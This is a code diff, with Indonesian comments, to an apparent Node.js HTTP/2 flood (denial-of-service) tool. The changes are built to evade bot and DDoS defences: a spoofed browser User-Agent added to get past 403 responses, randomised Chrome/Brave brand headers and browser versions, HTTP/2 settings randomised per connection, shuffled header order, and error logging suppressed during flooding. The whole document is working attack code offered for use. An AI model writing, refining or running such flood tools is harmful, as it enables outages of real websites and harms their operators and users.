@@ -175,12 +175,14 @@ if (isNaN(ratelimit) || ratelimit <= 0) {
     const requestHeaders = {
         'Accept': 'text/html',
         'Accept-Language': 'en-US,en;q=0.5',
+        // Perbaikan untuk 403: Menambahkan User-Agent
+        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36',
     };
     const buffer = Buffer.alloc(1024);
     const performRequest = async () => {
         try {
             await axios({
-                method: POST,
+                method: reqmethod, // Sudah diperbaiki dari error sebelumnya
                 url: url,
                 headers: requestHeaders,
                 responseType: 'arraybuffer',
@@ -188,7 +190,8 @@ if (isNaN(ratelimit) || ratelimit <= 0) {
                 timeout: 10000,
             });
         } catch (error) {
-            console.error(`Request failed: ${error.message}`);  // Fixed here
+            // Perbaikan: Menghapus log error untuk mencegah console banjir
+            // console.error(`Request failed: ${error.message}`);  
         }
     };
     const startFlood = async () => {
@@ -323,15 +326,30 @@ function generateUserAgent() {
 function sleep(ms) {
   return new Promise(resolve => setTimeout(resolve, ms));
 }
+
+// Fungsi untuk mengacak urutan elemen dalam array (Fisher-Yates)
+function shuffleArray(array) {
+    for (let i = array.length - 1; i > 0; i--) {
+        const j = Math.floor(Math.random() * (i + 1));
+        [array[i], array[j]] = [array[j], array[i]];
+    }
+    return array;
+}
+
+// Fungsi untuk mendapatkan pengaturan H2 yang sedikit dirandom
+function getRandomSetting(base, minOffset, maxOffset) {
+    const offset = Math.floor(Math.random() * (maxOffset - minOffset + 1)) + minOffset;
+    return base + offset;
+}
+
 var cipper = cplist[Math.floor(Math.floor(Math.random() * cplist.length))];
 
 const statusesQ = []
 let statuses = {}
 let isFull = process.argv.includes('--full');
-let custom_table = 65535;
-let custom_window = 6291456;
-let custom_header = 262144;
-let custom_update = 15663105;
+
+// Hapus variabel global custom_table/window/header/update, karena akan dibuat per koneksi
+
 let timer = 0;
 
 function encodeFrame(streamId, type, payload = "", flags = 0) {
@@ -450,45 +468,51 @@ function getRandomInt(min, max) {
 
 
 function buildRequest() {
-    const browserVersion = getRandomInt(120, 123);
+    // Diperluas ke rentang versi browser yang lebih luas (100-125)
+    const browserVersion = getRandomInt(100, 125);
 
     const fwfw = ['Google Chrome', 'Brave', 'Yandex'];
     const wfwf = fwfw[Math.floor(Math.random() * fwfw.length)];
 
     let brandValue;
-    if (browserVersion === 120) {
-        brandValue = `"Not_A Brand";v="8", "Chromium";v="${browserVersion}", "${wfwf}";v="${browserVersion}"`;
+    if (browserVersion >= 120) {
+        brandValue = `"Not_A Brand";v="${getRandomInt(7, 9)}", "Chromium";v="${browserVersion}", "${wfwf}";v="${browserVersion}"`;
     }
-    else if (browserVersion === 121) {
-        brandValue = `"Not A(Brand";v="99", "${wfwf}";v="${browserVersion}", "Chromium";v="${browserVersion}"`;
+    else if (browserVersion >= 110) {
+        brandValue = `"Not A(Brand";v="${getRandomInt(80, 100)}", "${wfwf}";v="${browserVersion}", "Chromium";v="${browserVersion}"`;
     }
-    else if (browserVersion === 124) {
-        brandValue = `"Mozilla/5.0 (Windows NT 10.0";v="99", "${wfwf}";v="${browserVersion}", "Chromium";v="${browserVersion}"`;
-    }
-    else if (browserVersion === 122) {
-        brandValue = `"Chromium";v="${browserVersion}", "Not(A:Brand";v="24", "${wfwf}";v="${browserVersion}"`;
-    }
-    else if (browserVersion === 132) {
-        brandValue = `"${wfwf}";v="${browserVersion}", "Not:A-Brand";v="8", "Chromium";v="${browserVersion}"`;
+    else {
+        brandValue = `"Chromium";v="${browserVersion}", "Not(A:Brand";v="${getRandomInt(10, 50)}", "${wfwf}";v="${browserVersion}"`;
     }
 
     const isBrave = wfwf === 'Brave';
 
+    // FIX: Mengubah rantai operator ternary yang salah menjadi pemilihan acak dari array
+    const acceptHeadersList = [
+        'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+        'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8', 
+        'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9', 
+        'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 
+        'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8', 
+        'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
+        'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8'
+    ];
+    const langValuesList = [
+        'en-US,en;q=0.7',
+        'en-US,en;q=0.8',
+        'en-US,en;q=0.9',
+        'id-ID,id;q=0.9'
+    ];
+
     const acceptHeaderValue = isBrave
-        ? 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8'
-        : 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7'
-        ? 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' 
-        : 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9' 
-        ? 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8' 
-        : 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' 
-        ? 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9'
-        : 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8';
+        ? 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8' // Nilai spesifik untuk Brave
+        : getRandomElement(acceptHeadersList); // Nilai acak untuk browser lain
 
     const langValue = isBrave
-        ? 'en-US,en;q=0.6'
-        : 'en-US,en;q=0.7'
-        ? 'en-US,en;q=0.8'
-        : 'id-ID,id;q=0.9';
+        ? 'en-US,en;q=0.6' // Nilai spesifik untuk Brave
+        : getRandomElement(langValuesList); // Nilai acak untuk browser lain
+
+
     const secChUa = `${brandValue}`;
     const currentRefererValue = refererValue === 'rand' ? 'https://' + ememmmmmemmeme(6, 6) + ".net" : refererValue;
 
@@ -603,6 +627,12 @@ function go() {
                 let hpack = new HPACK()
                 hpack.setTableSize(4096)
 
+                // Perbaikan: Merandomisasi pengaturan H2 per koneksi
+                const custom_header = getRandomSetting(262144, 0, 10);
+                const custom_window = getRandomSetting(6291456, 0, 100);
+                const custom_table = getRandomSetting(65535, 0, 10);
+                const custom_update = getRandomSetting(15663105, 0, 100);
+
                 const updateWindow = Buffer.alloc(4)
                 updateWindow.writeUInt32BE(custom_update, 0)
 
@@ -681,7 +711,8 @@ function go() {
                         ratelimit = process.argv[6];
                     }
                     for (let i = 0; i < (isFull ? ratelimit : 1); i++) {
-                        const browserVersion = getRandomInt(120, 123);
+                        // Diperluas ke rentang versi browser yang lebih luas (100-125)
+                        const browserVersion = getRandomInt(100, 125);
 
                         const fwfw = ['Google Chrome', 'Brave'];
                         const wfwf = fwfw[Math.floor(Math.random() * fwfw.length)];
@@ -689,35 +720,41 @@ function go() {
                         const ref1 = ref[Math.floor(Math.random() * ref.length)];
 
                         let brandValue;
-                        if (browserVersion === 120) {
-                            brandValue = `\"Not_A Brand\";v=\"8\", \"Chromium\";v=\"${browserVersion}\", \"${wfwf}\";v=\"${browserVersion}\"`;
-                        } else if (browserVersion === 121) {
-                            brandValue = `\"Not A(Brand\";v=\"99\", \"${wfwf}\";v=\"${browserVersion}\", \"Chromium\";v=\"${browserVersion}\"`;
+                        if (browserVersion >= 120) {
+                            brandValue = `\"Not_A Brand\";v=\"${getRandomInt(7, 9)}\", \"Chromium\";v=\"${browserVersion}\", \"${wfwf}\";v=\"${browserVersion}\"`;
+                        } else if (browserVersion >= 110) {
+                            brandValue = `\"Not A(Brand\";v=\"${getRandomInt(80, 100)}\", \"${wfwf}\";v=\"${browserVersion}\", \"Chromium\";v=\"${browserVersion}\"`;
                         }
-                        else if (browserVersion === 122) {
-                            brandValue = `\"Chromium\";v=\"${browserVersion}\", \"Not(A:Brand\";v=\"24\", \"${wfwf}\";v=\"${browserVersion}\"`;
-                        }
-                        else if (browserVersion === 132) {
-                            brandValue = `\"${wfwf}\";v=\"${browserVersion}\", \"Not:A-Brand\";v=\"8\", \"Chromium\";v=\"${browserVersion}\"`;
+                        else {
+                            brandValue = `\"Chromium\";v=\"${browserVersion}\", \"Not(A:Brand\";v=\"${getRandomInt(10, 50)}\", \"${wfwf}\";v=\"${browserVersion}\"`;
                         }
 
                         const isBrave = wfwf === 'Brave';
 
+                        // FIX: Mengubah rantai operator ternary yang salah menjadi pemilihan acak dari array
+                        const acceptHeadersList = [
+                            'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+                            'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8', 
+                            'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9', 
+                            'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 
+                            'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8', 
+                            'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
+                            'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8'
+                        ];
+                        const langValuesList = [
+                            'en-US,en;q=0.7',
+                            'en-US,en;q=0.8',
+                            'en-US,en;q=0.9',
+                            'id-ID,id;q=0.9'
+                        ];
+
                         const acceptHeaderValue = isBrave
-                            ? 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8'
-                            : 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7'
-                            ? 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' 
-                            : 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9' 
-                            ? 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8' 
-                            : 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' 
-                            ? 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9'
-                            : 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8';
+                            ? 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8' // Nilai spesifik untuk Brave
+                            : getRandomElement(acceptHeadersList); // Nilai acak untuk browser lain
 
                         const langValue = isBrave
-                        ? 'en-US,en;q=0.7'
-                        : 'en-US,en;q=0.8'
-                        ? 'en-US,en;q=0.9'
-                        : 'id-ID,id;q=0.9';
+                            ? 'en-US,en;q=0.6' // Nilai spesifik untuk Brave
+                            : getRandomElement(langValuesList); // Nilai acak untuk browser lain
 
                         const secGpcValue = isBrave ? "1" : undefined;
 
@@ -728,12 +765,17 @@ function go() {
 
                         const secChUa = `${brandValue}`;
                         const currentRefererValue = refererValue === 'rand' ? 'https://' + ememmmmmemmeme(6, 6) + ".net" : refererValue;
-                        const headers = Object.entries({
+                        
+                        // Pseudo Headers (Wajib di awal dan berurutan)
+                        const pseudoHeaders = Object.entries({
                             ":method": reqmethod,
                             ":authority": url.hostname,
                             ":scheme": "https",
                             ":path": query ? handleQuery(query) : url.pathname + (postdata ? `?${postdata}` : ""),
-                        }).concat(Object.entries({
+                        });
+                        
+                        // Regular Headers
+                        const regularHeaders = Object.entries({
                             ...(Math.random() < 0.4 && { "cache-control": "max-age=0" }),
                             ...(reqmethod === "POST" && { "content-length": "0" }),
                             "sec-ch-ua": secChUa,
@@ -753,17 +795,17 @@ function go() {
                             ...(Math.random() < 0.5 && { "sec-fetch-dest": "document" }),
                             "accept-encoding": "gzip, deflate, br",
                             "accept-language": langValue,
+                            // Tambahkan header opsional lainnya
+                            ...(Math.random() < 0.3 && { "dnt": "1" }),
+                            ...(Math.random() < 0.2 && { "priority": "u=1, i" }),
+                            ...(Math.random() < 0.2 && { "te": "trailers" }),
                             ...(hcookie && { "cookie": hcookie }),
                             ...(currentRefererValue && { "referer": currentRefererValue }),
                             ...customHeadersArray.reduce((acc, header) => ({ ...acc, ...header }), {})
-                        }).filter(a => a[1] != null));
+                        }).filter(a => a[1] != null);
 
-                        const headers3 = Object.entries({
-                            ":method": reqmethod,
-                            ":authority": url.hostname,
-                            ":scheme": "https",
-                            ":path": query ? handleQuery(query) : url.pathname + (postdata ? `?${postdata}` : ""),
-                        }).concat(Object.entries({
+                        // Regular Headers untuk --legit mode
+                        const regularHeadersLegit = Object.entries({
                             ...(Math.random() < 0.4 && { "cache-control": "max-age=0" }),
                             ...(reqmethod === "POST" && { "content-length": "0" }),
                             "sec-ch-ua": secChUa,
@@ -787,7 +829,7 @@ function go() {
                             ...(hcookie && { "cookie": hcookie }),
                             ...(currentRefererValue && { "referer": currentRefererValue }),
                             ...customHeadersArray.reduce((acc, header) => ({ ...acc, ...header }), {})
-                        }).filter(a => a[1] != null));
+                        }).filter(a => a[1] != null);
 
                         const headers2 = Object.entries({
                             ...(Math.random() < 0.3 && { [`x-client-session${getRandomChar()}`]: `none${getRandomChar()}` }),
@@ -796,12 +838,23 @@ function go() {
                             ...(Math.random() < 0.3 && { [`x-request-data${getRandomChar()}`]: `dynamic${getRandomChar()}` }),
                         }).filter(a => a[1] != null);
 
+                        // Shuffle headers2 only (sudah ada)
                         for (let i = headers2.length - 1; i > 0; i--) {
                             const j = Math.floor(Math.random() * (i + 1));
                             [headers2[i], headers2[j]] = [headers2[j], headers2[i]];
                         }
 
-                        const combinedHeaders = useLegitHeaders ? headers3.concat() : headers.concat(headers2);
+                        let finalRegularHeaders;
+                        if (useLegitHeaders) {
+                            finalRegularHeaders = regularHeadersLegit;
+                        } else {
+                            finalRegularHeaders = regularHeaders.concat(headers2);
+                            // Perbaikan: Shuffle urutan header non-pseudo (finalRegularHeaders)
+                            finalRegularHeaders = shuffleArray(finalRegularHeaders);
+                        }
+                        
+                        const combinedHeaders = pseudoHeaders.concat(finalRegularHeaders);
+
 
                         function handleQuery(query) {
                             if (query === '1') {
@@ -878,6 +931,8 @@ setInterval(() => {
     timer++;
 }, 1000);
 
+// Hapus interval perubahan custom_table/window/header/update, karena sudah dibuat per koneksi
+/*
 setInterval(() => {
     if (timer <= 10) {
         custom_header = custom_header + 1;
@@ -892,6 +947,7 @@ setInterval(() => {
         timer = 0;
     }
 }, 10000);
+*/
 
 if (cluster.isMaster) {
 
